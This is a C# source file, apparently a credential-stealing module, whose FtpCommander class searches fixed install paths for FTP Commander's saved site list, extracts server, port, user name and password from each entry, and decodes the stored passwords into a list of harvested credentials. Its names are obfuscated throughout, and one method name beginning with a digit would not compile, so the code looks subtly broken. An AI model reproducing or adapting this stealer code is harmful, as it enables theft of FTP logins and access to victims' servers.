using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;
using JSW1fecBOy;
using reJu9lk2r;

namespace rk937aHHc
{
	public class FtpCommander : EtbH
	{
		public FtpCommander()
		{
			this.G3noWIroNns = "FtpCommander";
		}

		public string G3noWIroNns { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            string[] paths =
            {
                Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files (x86)\FTP Commander Deluxe\Ftplist.txt",
                Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files (x86)\FTP Commander\Ftplist.txt",
                Environment.GetEnvironmentVariable("SystemDrive") + @"\cftp\Ftplist.txt",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                    @"\VirtualStore\Program Files (x86)\FTP Commander\Ftplist.txt",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                    @"\VirtualStore\Program Files (x86)\FTP Commander Deluxe\Ftplist.txt"
            };

            foreach (string path in paths)
            {
                if (!File.Exists(path))
                    continue;

                try
                {
                    string[] lines = File.ReadAllLines(path);

                    foreach (string line in lines)
                    {
                        try
                        {
                            string server = g3Vt7T2gk5.1b9(line, ";Server=", ";Port=", 0);
                            string port = g3Vt7T2gk5.1b9(line, ";Port=", ";Password=", 0);
                            string user = g3Vt7T2gk5.1b9(line, ";User=", ";Anonymous=", 0);
                            string pwdRaw = g3Vt7T2gk5.1b9(line, ";Password=", ";User=", 0);

                            if (string.IsNullOrEmpty(pwdRaw) || pwdRaw.Length < 2)
                                continue;

                            string password = eha4ad2F.h5FmNC(pwdRaw, 25);

                            list.Add(new WTitxI2m(
                                $"{server}:{port}",
                                user,
                                password,
                                this.G3noWIroNns
                            ));
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }

            return list;
        }
    }
}
